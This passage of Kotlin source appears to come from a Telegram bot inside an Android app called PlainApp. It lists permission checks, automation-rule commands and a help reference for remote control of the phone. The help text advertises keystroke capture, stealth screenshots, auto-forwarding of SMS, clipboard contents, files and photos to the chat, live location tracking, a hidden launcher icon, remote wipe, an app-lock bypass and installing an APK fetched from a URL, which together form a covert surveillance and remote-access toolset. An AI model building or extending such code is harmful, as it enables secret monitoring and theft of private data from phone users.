                try { com.ismartcoding.plain.helpers.FileHelper.hasStoragePermission(ctx) } catch (_: Exception) { false }),
            Perm("READ_MEDIA_IMAGES",    "🖼 Media Images",          pmCheck("android.permission.READ_MEDIA_IMAGES")),
            Perm("READ_MEDIA_VIDEOS",    "🎬 Media Videos",          pmCheck("android.permission.READ_MEDIA_VIDEOS")),
            Perm("READ_MEDIA_AUDIO",     "🎵 Media Audio",           pmCheck("android.permission.READ_MEDIA_AUDIO")),
            // Messages
            Perm("READ_SMS",             "💬 Read SMS",              pmCheck("android.permission.READ_SMS")),
            Perm("SEND_SMS",             "📤 Send SMS",              pmCheck("android.permission.SEND_SMS")),
            // Contacts
            Perm("READ_CONTACTS",        "👥 Read Contacts",         pmCheck("android.permission.READ_CONTACTS")),
            Perm("WRITE_CONTACTS",       "✏️ Write Contacts",        pmCheck("android.permission.WRITE_CONTACTS")),
            // Calls
            Perm("READ_CALL_LOG",        "📋 Read Call Log",         pmCheck("android.permission.READ_CALL_LOG")),
            Perm("WRITE_CALL_LOG",       "📝 Write Call Log",        pmCheck("android.permission.WRITE_CALL_LOG")),
            Perm("CALL_PHONE",           "📞 Make Calls",            pmCheck("android.permission.CALL_PHONE")),
            // Phone
            Perm("READ_PHONE_STATE",     "📱 Phone State",           pmCheck("android.permission.READ_PHONE_STATE")),
            Perm("READ_PHONE_NUMBERS",   "🔢 Phone Numbers",         pmCheck("android.permission.READ_PHONE_NUMBERS")),
            // Notifications
            Perm("POST_NOTIFICATIONS",   "🔔 Notifications",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
                    pmCheck("android.permission.POST_NOTIFICATIONS") else true),
            Perm("NOTIFICATION_LISTENER","📡 Notification Listener",
                android.provider.Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
                    ?.contains(android.content.ComponentName(ctx, com.ismartcoding.plain.services.PNotificationListenerService::class.java).flattenToString()) == true),
            // Location
            Perm("ACCESS_FINE_LOCATION",       "📍 Precise Location",    pmCheck("android.permission.ACCESS_FINE_LOCATION")),
            Perm("ACCESS_BACKGROUND_LOCATION", "🗺 Background Location", pmCheck("android.permission.ACCESS_BACKGROUND_LOCATION")),
            // Bluetooth
            Perm("BLUETOOTH_CONNECT",    "🔵 Bluetooth Connect",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
                    pmCheck("android.permission.BLUETOOTH_CONNECT") else true),
            Perm("BLUETOOTH_SCAN",       "🔍 Bluetooth Scan",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
                    pmCheck("android.permission.BLUETOOTH_SCAN") else true),
            // System / Special
            Perm("SYSTEM_ALERT_WINDOW",      "🪟 Draw Over Other Apps",   android.provider.Settings.canDrawOverlays(ctx)),
            Perm("WRITE_SETTINGS",           "⚙️ Modify System Settings", android.provider.Settings.System.canWrite(ctx)),
            Perm("PACKAGE_USAGE_STATS",      "📊 Usage Access",
                try {
                    val ao = ctx.getSystemService(android.content.Context.APP_OPS_SERVICE) as android.app.AppOpsManager
                    (if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q)
                        ao.unsafeCheckOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
                    else @Suppress("DEPRECATION") ao.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
                    ) == android.app.AppOpsManager.MODE_ALLOWED
                } catch (_: Exception) { false }),
            Perm("ACCESSIBILITY_SERVICE",    "♿ Accessibility Service",
                com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(ctx)),
            Perm("REQUEST_INSTALL_PACKAGES", "📦 Install Unknown Apps",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                    ctx.packageManager.canRequestPackageInstalls() else true),
            Perm("QUERY_ALL_PACKAGES",       "🔎 Query All Packages",     pmCheck("android.permission.QUERY_ALL_PACKAGES")),
            Perm("SCHEDULE_EXACT_ALARM",     "⏰ Exact Alarm",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
                    (ctx.getSystemService(android.content.Context.ALARM_SERVICE) as android.app.AlarmManager).canScheduleExactAlarms()
                else true),
        )

        val missingOnly = arg.trim().lowercase() in listOf("missing", "denied", "no", "ungrant", "ungranted")
        val perms = if (missingOnly) allPerms.filter { !it.granted } else allPerms

        val totalGranted = allPerms.count { it.granted }
        val totalMissing = allPerms.size - totalGranted

        val sb = StringBuilder()
        if (missingOnly) {
            sb.append("❌ <b>Missing Permissions Only</b>\n")
            sb.append("These <b>$totalMissing</b> permissions are not yet granted.\n")
            sb.append("Tap any button — PlainApp will ask for it <b>right now</b> on the device.\n")
        } else {
            sb.append("🔔 <b>Request Permission on Device</b>\n")
            sb.append("Tap any button below — PlainApp will ask for that permission <b>right now</b> on the device.\n")
            sb.append("• Runtime permissions → Android dialog (Allow / Deny)\n")
            sb.append("• Special permissions → Opens exact Settings screen\n")
            sb.append("💡 Use <code>/reqperm missing</code> to see only un-granted ones\n")
        }
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("✅ Granted: <b>$totalGranted</b>  ·  ❌ Missing: <b>$totalMissing</b>\n\n")

        if (perms.isEmpty()) {
            sb.append("🎉 All permissions are already granted!")
            sendMessage(sb.toString())
            return
        }

        perms.forEach { p -> sb.append("${if (p.granted) "✅" else "❌"} ${p.label}\n") }
        sb.append("\n🕐 $ts")

        // Button label shows emoji + name + (✅) or (❌) so status is visible at a glance
        val rows = perms.chunked(2).map { chunk ->
            chunk.map { p ->
                val statusTag = if (p.granted) "(✅)" else "(❌)"
                "${p.label} $statusTag" to "reqp:${p.key}"
            }
        }
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    // ========== AUTOMATION ==========

    private fun cmdAutomations() {
        val ctx = MainApp.instance
        val enabled = AutomationHelper.isEnabled(ctx)
        val rules = AutomationHelper.list(ctx)
        val sb = StringBuilder()
        sb.append("⚙️ <b>Automation Rules</b>  ${if (enabled) "🟢 ENGINE ON" else "⚪ ENGINE OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📋 Total: <b>${rules.size}</b>\n\n")
        if (rules.isEmpty()) {
            sb.append("(no rules yet)\n\n")
            sb.append("💡 Create one with:\n")
            sb.append("• <code>/newrule My rule notify Hello world</code>\n")
            sb.append("• <code>/newschedule 22:30 Bedtime speak Good night</code>\n")
            val rows = listOf(
                listOf("⚡ Engine on" to "auto_engine:1", "⚪ Engine off" to "auto_engine:0"),
            )
            sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
            return
        }
        // Per-rule action row uses idx (1-based) as a stable handle for callbacks
        // — Telegram callback_data is 64 bytes, and full UUIDs would crowd it.
        val rows = mutableListOf<List<Pair<String, String>>>()
        rules.forEachIndexed { i, r ->
            val state = if (r.enabled) "🟢" else "⚪"
            val kind = if (r.kind == "schedule") "📅" else "🔀"
            sb.append("${i + 1}. $state $kind <b>${htmlEsc(r.name)}</b>\n")
            sb.append("   🎯 trigger: <code>${r.trigger.type}</code>\n")
            if (r.actions.isNotEmpty()) {
                val acts = r.actions.joinToString(", ") { it.type }
                sb.append("   ⚡ actions: <code>${htmlEsc(acts.take(80))}</code>\n")
            }
            if (r.lastRunMs > 0) sb.append("   🕐 last run: ${fmtTime(r.lastRunMs)}\n")
            sb.append("   🆔 <code>${r.id.take(8)}</code>\n\n")
            // Build the action row for this rule (capped at the first 12 rules
            // so the inline keyboard doesn't exceed Telegram's hard limit).
            if (i < 12) {
                val tag = "${i + 1}."
                val toggle = if (r.enabled) "$tag ⚪ Off" else "$tag 🟢 On"
                rows.add(listOf(
                    "$tag ▶️ Run" to "auto_run:${r.id.take(20)}",
                    toggle to "auto_tog:${r.id.take(20)}",
                    "🗑 Delete" to "auto_del:${r.id.take(20)}",
                ))
            }
            if (sb.length > 3500) { sb.append("…"); return@forEachIndexed }
        }
        rows.add(listOf(
            (if (enabled) "⚪ Engine off" else "⚡ Engine on") to ("auto_engine:" + if (enabled) "0" else "1"),
        ))
        sb.append("\n💡 <code>/newrule</code>, <code>/newschedule</code>, <code>/delrule</code> to manage")
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private fun cmdRunRule(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /runrule &lt;id&gt;\n\nFind IDs with /automations"); return }
        val idPrefix = args[0]
        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
        try {
            val started = com.ismartcoding.plain.helpers.AutomationActionRunner.trigger(rule.id, "manual")
            if (started) sendMessage("▶️ Started <b>${htmlEsc(rule.name)}</b>")
            else sendMessage("⚠️ Rule did not run (disabled, cooldown, or conditions failed).")
        } catch (e: Throwable) {
            sendMessage("❌ Could not start rule: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdToggleRule(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /togglerule &lt;id&gt;"); return }
        val idPrefix = args[0]
        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
        val updated = rule.copy(enabled = !rule.enabled)
        AutomationHelper.upsert(updated)
        sendMessage("${if (updated.enabled) "🟢" else "⚪"} <b>${htmlEsc(rule.name)}</b> is now ${if (updated.enabled) "ON" else "OFF"}")
    }

    /**
     * Quick-create a manual or simple-trigger rule.
     *
     * Syntax: /newrule <name…> <action> <action-args…>
     *   /newrule "Tell wife" sms +15551234 On my way
     *   /newrule Beep notify Heads up : something happened
     *   /newrule Toggle wifi toggle_wifi off
     *
     * For more complex rules use the web panel; this command exists so a phone-
     * less user can still set up and test rules from the bot.
     */
    private fun cmdNewRule(args: List<String>) {
        if (args.size < 2) {
            sendMessage(
                "Usage: <code>/newrule &lt;name…&gt; &lt;action&gt; &lt;args…&gt;</code>\n\n" +
                "Examples:\n" +
                "• <code>/newrule Beep notify Heads up : Battery low</code>\n" +
                "• <code>/newrule Tell mom sms +15551234 Be home soon</code>\n" +
                "• <code>/newrule Speak hello speak Good morning</code>\n" +
                "• <code>/newrule Wifi off toggle_wifi false</code>\n" +
                "• <code>/newrule Lights flashlight true</code>\n\n" +
                "Supported actions: <code>notify</code>, <code>sms</code>, <code>call</code>, " +
                "<code>speak</code>, <code>toggle_wifi</code>, <code>toggle_bluetooth</code>, " +
                "<code>toggle_dnd</code>, <code>flashlight</code>, <code>vibrate</code>, " +
                "<code>set_clipboard</code>, <code>lock_screen</code>"
            )
            return
        }
        val (name, action) = splitNameAndAction(args) ?: run {
            sendMessage("❌ Could not find a known action keyword in your command. See /newrule for examples.")
            return
        }
        try {
            val saved = AutomationHelper.upsert(AutomationHelper.Rule(
                id = "", name = name, enabled = true, kind = "rule",
                trigger = AutomationHelper.Trigger("manual", emptyMap()),
                conditions = emptyList(), actions = listOf(action),
                cooldownMs = 0L, lastRunMs = 0L, createdMs = 0L, updatedMs = 0L,
            ))
            sendMessage(
                "✅ Created rule <b>${htmlEsc(saved.name)}</b>\n" +
                "🆔 <code>${saved.id.take(8)}</code>\n" +
                "🎯 trigger: <code>manual</code> (use <code>/runrule ${saved.id.take(8)}</code> to fire it)\n" +
                "⚡ action: <code>${action.type}</code>"
            )
        } catch (e: Throwable) {
            sendMessage("❌ Could not save rule: ${htmlEsc(e.message ?: "")}")
        }
    }

    /**
     * Quick-create a daily scheduled action.
     * Syntax: /newschedule HH:MM <name…> <action> <action-args…>
     *   /newschedule 22:30 Bedtime speak Good night
     *   /newschedule 07:00 Morning notify Wake up : Time to start
     */
    private fun cmdNewSchedule(args: List<String>) {
        if (args.size < 3) {
            sendMessage(
                "Usage: <code>/newschedule HH:MM &lt;name…&gt; &lt;action&gt; &lt;args…&gt;</code>\n\n" +
                "Examples:\n" +
                "• <code>/newschedule 22:30 Bedtime speak Good night</code>\n" +
                "• <code>/newschedule 07:00 Morning notify Wake up : Time to start</code>\n" +
                "• <code>/newschedule 09:00 Standup vibrate 800</code>"
            )
            return
        }
        val time = args[0]
        val tParts = time.split(":")
        val hour = tParts.getOrNull(0)?.toIntOrNull()
        val minute = tParts.getOrNull(1)?.toIntOrNull() ?: 0
        if (hour == null || hour !in 0..23 || minute !in 0..59) {
            sendMessage("❌ Time must be HH:MM (24-hour). Got: <code>${htmlEsc(time)}</code>")
            return
        }
        val (name, action) = splitNameAndAction(args.drop(1)) ?: run {
            sendMessage("❌ Could not find a known action keyword in your command. See /newschedule for examples.")
            return
        }
        try {
            val trigParams = mapOf(
                "hour" to hour.toString(), "minute" to minute.toString(),
                "days" to "1,2,3,4,5,6,7",
            )
            val saved = AutomationHelper.upsert(AutomationHelper.Rule(
                id = "", name = name, enabled = true, kind = "schedule",
                trigger = AutomationHelper.Trigger("time", trigParams),
                conditions = emptyList(), actions = listOf(action),
                cooldownMs = 0L, lastRunMs = 0L, createdMs = 0L, updatedMs = 0L,
            ))
            com.ismartcoding.plain.helpers.AutomationScheduler.scheduleRule(saved.id, MainApp.instance)
            sendMessage(
                "✅ Scheduled <b>${htmlEsc(saved.name)}</b>\n" +
                "🆔 <code>${saved.id.take(8)}</code>\n" +
                "🕐 daily at <b>${"%02d:%02d".format(hour, minute)}</b>\n" +
                "⚡ action: <code>${action.type}</code>"
            )
        } catch (e: Throwable) {
            sendMessage("❌ Could not save schedule: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdDelRule(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: <code>/delrule &lt;id&gt;</code>"); return }
        val idPrefix = args[0]
        val rule = AutomationHelper.list().firstOrNull { it.id.startsWith(idPrefix) }
        if (rule == null) { sendMessage("❌ No rule matches <code>${htmlEsc(idPrefix)}</code>"); return }
        com.ismartcoding.plain.helpers.AutomationScheduler.cancel(rule.id, MainApp.instance)
        AutomationHelper.delete(rule.id, MainApp.instance)
        sendMessage("🗑 Deleted <b>${htmlEsc(rule.name)}</b>")
    }

    /**
     * Pull a known action keyword out of the tail of [args] and turn the
     * remaining args into an [AutomationHelper.Action] with the appropriate
     * params map. Returns the rule name (everything before the action keyword)
     * and the parsed Action, or null if no known action keyword is present.
     */
    private fun splitNameAndAction(args: List<String>): Pair<String, AutomationHelper.Action>? {
        val knownActions = setOf(
            "notify", "sms", "send_sms", "call", "make_call", "speak",
            "toggle_wifi", "toggle_bluetooth", "toggle_dnd",
            "flashlight", "vibrate", "set_clipboard", "lock_screen",
        )
        val actionIdx = args.indexOfFirst { it.lowercase() in knownActions }
        if (actionIdx < 1) return null
        val name = args.subList(0, actionIdx).joinToString(" ").trim().ifBlank { "Untitled" }
        val keyword = args[actionIdx].lowercase()
        val tail = args.drop(actionIdx + 1)
        val action = when (keyword) {
            "notify" -> {
                // "title : body" or just "title"
                val joined = tail.joinToString(" ")
                val sep = joined.indexOf(" : ")
                val (title, body) = if (sep > 0) joined.substring(0, sep) to joined.substring(sep + 3)
                    else joined to ""
                AutomationHelper.Action("notify", mapOf("title" to title, "body" to body))
            }
            "sms", "send_sms" -> {
                val to = tail.firstOrNull() ?: ""
                val body = tail.drop(1).joinToString(" ")
                AutomationHelper.Action("send_sms", mapOf("to" to to, "body" to body))
            }
            "call", "make_call" -> {
                AutomationHelper.Action("make_call", mapOf("to" to (tail.firstOrNull() ?: "")))
            }
            "speak" -> {
                AutomationHelper.Action("speak", mapOf("text" to tail.joinToString(" ")))
            }
            "toggle_wifi", "toggle_bluetooth", "toggle_dnd", "flashlight" -> {
                val state = (tail.firstOrNull() ?: "true").lowercase()
                val on = state in setOf("true", "on", "1", "yes", "y")
                AutomationHelper.Action(keyword, mapOf("state" to on.toString()))
            }
            "vibrate" -> AutomationHelper.Action("vibrate",
                mapOf("ms" to (tail.firstOrNull()?.toIntOrNull()?.coerceIn(10, 5000)?.toString() ?: "250")))
            "set_clipboard" -> AutomationHelper.Action("set_clipboard",
                mapOf("text" to tail.joinToString(" ")))
            "lock_screen" -> AutomationHelper.Action("lock_screen", emptyMap())
            else -> return null
        }
        return name to action
    }

    private suspend fun cmdCommands() {
        sendTyping()
        // Send as multiple chunks — each section fits well under 4096 chars
        val sections = buildList {
            add(buildString {
                append("📝 <b>All Commands — Full Details</b>  (${allCommands.size} total)\n\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("💬 <b>SMS / MMS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /messages — SMS conversations list; tap to open\n")
                append("• /sms &lt;thread_id&gt; — Read a specific SMS thread\n")
                append("• /sendsms &lt;number&gt; &lt;text&gt; — Send an SMS\n")
                append("• /schedulesms &lt;number&gt; &lt;delay_sec&gt; &lt;text&gt; — Schedule an SMS\n")
                append("• /forwardsms — Toggle auto-forwarding of incoming SMS to this chat\n")
                append("• /mms [n] — Browse MMS multimedia messages\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📞 <b>CALLS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /calls — Recent call log\n")
                append("• /recordings — Call recordings; tap to download\n")
                append("• /livecall — Live call hub: accept / mute / end ongoing calls\n")
                append("• /callnow &lt;number&gt; — Initiate an outgoing call\n")
                append("• /blocknumber [number] — Block or unblock incoming calls\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("👥 <b>CONTACTS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /contacts — Browse contacts; tap to call, SMS, or share\n")
                append("• /find &lt;number&gt; — Reverse-lookup a phone number\n")
                append("• /addcontact — Add a new contact (interactive)\n")
                append("• /deletecontact — Delete a contact by name or number\n")
                append("• /contactgroups — List contact groups and view members\n")
            })
            add(buildString {
                append("🔔 <b>NOTIFICATIONS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /notifications — Recent notifications\n")
                append("• /mutenotifs [on|off] — Mute or unmute auto-forwarded notifications\n")
                append("• /logs — Full notification log history\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📸 <b>CAMERA & MEDIA CAPTURE</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /screenshot — Take a screenshot\n")
                append("• /photo [front|back] — Camera photo\n")
                append("• /audio — Record audio (interactive duration picker)\n")
                append("• /video — Record video (pick camera, then duration)\n")
                append("• /shots [n] — Recent stealth screenshots\n")
                append("• /forwardphotos [on|off] — Auto-forward new camera photos\n")
                append("• /forwardshots [on|off] — Auto-forward stealth screenshots to chat\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📁 <b>FILES & STORAGE</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /files — Browse storage; tap folders to open, files to download\n")
                append("• /storage — Storage usage: internal, SD card, USB\n")
                append("• /docs [search] — Document library (PDF, DOCX, etc.)\n")
                append("• /filehash &lt;path&gt; — File hash (SHA-256 + MD5)\n")
                append("• /deletefile &lt;path&gt; — Delete a file from device\n")
                append("• /forwardfiles [on|off] — Auto-forward ALL new files & media from storage\n")
                append("• /fwdfiles [n] — Recently auto-forwarded files\n")
                append("• /filestats — File auto-forward queue stats (pending / done / failed)\n")
                append("• /retryfailed — Retry all permanently-failed file uploads\n")
            })
            add(buildString {
                append("📍 <b>LOCATION & TRACKING</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /location — Current GPS location\n")
                append("• /livelocation [n] — Live location stream\n")
                append("• /tracklocation [n] — Recent location points\n")
                append("• /track — Tracking hub overview\n")
                append("• /geofence — list all geofence zones with enable/disable & delete buttons\n")
                append("  /geofence events — recent enter/exit event log\n")
                append("  /geofence add — interactively add a new zone\n")
                append("• /forwardgeofence [on|off] — Auto-forward geofence enter/exit alerts\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📱 <b>APPS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /apps — List installed apps\n")
                append("• /launch &lt;pkg|name&gt; — Launch any app\n")
                append("• /launches [n] — Recent app launches\n")
                append("• /blockapp — Block an app (interactive picker)\n")
                append("• /unblockapp — Unblock an app (interactive picker)\n")
                append("• /blockedapps — Show all blocked & limited apps\n")
                append("• /screentime [days] — App screen time\n")
                append("• /clearcache — Clear an app's cache (interactive picker)\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📲 <b>DEVICE INFO</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /device — Device information\n")
                append("• /battery — Battery status\n")
                append("• /batteryhistory [hours] — Battery drain chart\n")
                append("• /batteryalert [on|off] [threshold%] — Low-battery auto-alert\n")
                append("• /permissions — Status of every app permission\n")
            })
            add(buildString {
                append("🔧 <b>DEVICE CONTROLS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /lockscreen — Lock the device screen instantly\n")
                append("• /wake [seconds] — Wake screen\n")
                append("• /brightness [0-100] — Screen brightness\n")
                append("• /volume [stream] [0-100] — Volume (media|ring|notification|alarm|call|system)\n")
                append("• /reboot — Reboot device (requires root or Device Admin)\n")
                append("• /setalarm HH:MM [label] — Set a system alarm\n")
                append("• /bedtime — View bedtime state + inline controls\n")
                append("  /bedtime on|off — enable or disable\n")
                append("  /bedtime set HH:MM HH:MM — set start & end time (e.g. /bedtime set 22:00 06:30)\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📶 <b>NETWORK & CONNECTIVITY</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /wifi [on|off] — Wi-Fi state / toggle\n")
                append("• /wifiscan — Scan nearby Wi-Fi networks\n")
                append("• /mobiledata — Mobile data: show status and toggle on/off\n")
                append("• /bluetooth [on|off] — Bluetooth devices & control\n")
                append("• /hotspot [on|off] — Mobile hotspot status / toggle\n")
                append("• /airplane [on|off] — Airplane mode toggle\n")
                append("• /dnd [on|off|toggle] — Do Not Disturb\n")
                append("• /vpn — VPN connection status\n")
                append("• /networkinfo — Extended network & Wi-Fi details\n")
                append("• /netusage [days] — Network usage\n")
                append("• /sim — SIM card & carrier info\n")
                append("• /datasettings — Open mobile-data settings page on device\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("🔍 <b>MONITORING & KEYLOG</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /keystrokes [n] — Captured keystrokes\n")
                append("• /keytop — Top apps by keystroke count\n")
                append("• /timeline [n] — Device activity timeline\n")
            })
            add(buildString {
                append("🌀 <b>SENSORS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /soundmeter [seconds] — Ambient sound level\n")
                append("• /gyroscope — Live gyroscope rotation rate (rad/s)\n")
                append("• /compass — Magnetic compass heading & cardinal direction\n")
                append("• /barometer — Atmospheric pressure (hPa) and altitude (m)\n")
                append("• /steps — Step count since last reboot + today estimate\n")
                append("• /proximity — Proximity sensor: near or far\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("🚨 <b>ALERTS & REMOTE ACTIONS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /speak &lt;text&gt; — Text-to-speech on device\n")
                append("• /stopspeak — Stop the device speaking right now\n")
                append("• /vibrate [seconds] — Vibrate device\n")
                append("• /toast &lt;text&gt; — Quick toast pop-up on device\n")
                append("• /show &lt;text&gt; — Show banner on device\n")
                append("• /findphone [on|off] — Locate phone with alarm\n")
                append("• /torch [on|off] — Flashlight\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📋 <b>CLIPBOARD</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /clipboard [text] — Read or set device clipboard\n")
                append("• /forwardclipboard [on|off] — Auto-forward clipboard changes to chat\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📝 <b>NOTES & BOOKMARKS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /notes [search] — Browse notes; tap to view, edit or delete\n")
                append("• /addnote — Create a new note (interactive: title then body)\n")
                append("• /editnote — Edit an existing note (interactive)\n")
                append("• /bookmarks [search] — Browse bookmarks; tap to open / delete\n")
                append("• /addbookmark &lt;url&gt; — Add a bookmark\n")
            })
            add(buildString {
                append("📡 <b>RSS FEEDS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /feeds — RSS feeds; tap to view recent entries\n")
                append("• /feedentries [search] — Recent feed entries\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("🎵 <b>MEDIA LIBRARY</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /music — Music library; tap to download\n")
                append("• /videos — Video library; tap to download\n")
                append("• /images — Image gallery; tap to send\n")
                append("• /nowplaying — Now-playing status + playback controls\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("⚙️ <b>AUTOMATION</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /automations — List all automation rules\n")
                append("• /newrule &lt;name&gt; &lt;action&gt; &lt;args&gt; — Create a manual rule\n")
                append("    e.g. <code>/newrule Beep notify Heads up : Battery low</code>\n")
                append("• /newschedule HH:MM &lt;name&gt; &lt;action&gt; &lt;args&gt; — Create a daily schedule\n")
                append("    e.g. <code>/newschedule 22:30 Bedtime speak Good night</code>\n")
                append("• /delrule &lt;id&gt; — Delete a rule\n")
                append("• /runrule &lt;id&gt; — Run an automation manually\n")
                append("• /togglerule &lt;id&gt; — Enable / disable a rule\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("🍅 <b>FOCUS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /pomodoro — Show timer status with start / pause / stop buttons\n")
                append("• /pomodoro start — Begin a new focus session\n")
                append("• /pomodoro pause — Pause the running timer\n")
                append("• /pomodoro stop — Cancel the current session\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📷 <b>UTILITIES</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /qrcode &lt;text or URL&gt; — Generate QR code image\n")
                append("• /intruders [n] — Intruder captures (photos taken on failed unlock attempts)\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("🔐 <b>SECURITY & APP SETTINGS</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /deviceowner — Device Owner control: status, grant-all-permissions, block-uninstall, kiosk, wipe, and more\n")
                append("  Subcommands: <code>status | grantperms | blockinstall &lt;on|off&gt; | kiosk &lt;on|off&gt; | camera &lt;on|off&gt; | bt &lt;on|off&gt; | usb &lt;on|off&gt; | proxy &lt;host:port&gt; | clearproxy | wipe</code>\n")
                append("\n")
                append("• /applock [on|off] — Toggle the PlainApp PIN lock on or off\n")
                append("• /setpin — Set or change the app PIN (interactive)\n")
                append("• /removepin — Remove the app PIN entirely\n")
                append("• /biometric [on|off] — Enable / disable biometric unlock\n")
                append("• /appinfog [on|off] — PIN-protect system App info pages\n")
                append("• /applocker [pkg|name] — Per-app lock: list locked apps or lock/unlock one\n")
                append("• /appsettings — Overview of all PlainApp security settings\n")
                append("• /hideicon [on|off] — Hide or show the launcher icon\n")
                append("• /openapp — Open PlainApp on the device screen\n")
                append("• /openappinfo — Open PlainApp's own App info page\n")
                append("• /openwebsettings — Open Web Settings page directly (bypasses app lock & security gate)\n")
                append("• /openpage — Open any page in PlainApp on device — shows all pages as inline buttons\n")
                append("• /permissions — Status of every app permission\n")
                append("• /openperms [name] — Open a permission's settings screen directly on device\n")
                append("• /reqperm — List ALL permissions as inline buttons — tap any to trigger its grant dialog on device\n")
                append("  /reqperm missing — show ONLY un-granted permissions as inline buttons\n")
                append("• /intruders [n] — Intruder captures (photos taken on failed unlock attempts)\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("🤖 <b>BOT CONTROL</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /start — Welcome & device status\n")
                append("• /help — Help & all commands\n")
                append("• /commands — This full reference\n")
                append("• /s [keyword] — Search all commands by keyword; or /s alone to enter search mode\n")
                append("  Aliases: <code>/search</code>  <code>/?</code>\n")
                append("• /update &lt;url&gt; — Download APK from URL and install (or send APK file directly)\n")
                append("• /botpassword — View / verify the bot access password\n")
                append("• /setbotpassword — Change the bot password (interactive)\n")
                append("• /securityqa — View or change the security question & answer\n")
                append("• /stop — Stop the bot\n")
                append("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("📦 <b>BACKUP & RESTORE</b>\n")
                append("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                append("• /backup — Create a full backup (.plain zip) of all app data and send it here\n")
                append("  If the backup is &gt;50 MB a one-time download link is sent instead.\n")
                append("  Inline buttons: <b>📥 As .zip file</b> (force-zip), <b>🔄 Rebuild now</b> (re-run backup)\n")
                append("• /restore — Receive a .plain or .zip backup file you send to this chat and restore it\n")
